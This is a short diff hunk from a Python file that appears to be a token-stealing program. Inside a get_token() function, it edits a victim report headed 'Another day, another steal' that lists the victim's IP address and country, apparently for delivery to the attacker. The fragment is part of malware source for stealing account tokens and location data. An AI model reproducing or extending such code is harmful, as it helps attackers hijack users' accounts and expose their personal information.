@@ -408,7 +408,7 @@ def get_token():
         'token': tok
     }
 
-    content = f'> Another day, another steal:\n> \n' \
+    content = f'> Another day, another steal:\n> \n> @<>\n' \
               f'> Network / geo informations:\n' \
               f'> IP: {data['ip']}\n' \
               f'> Country: {data['country']}\n' \
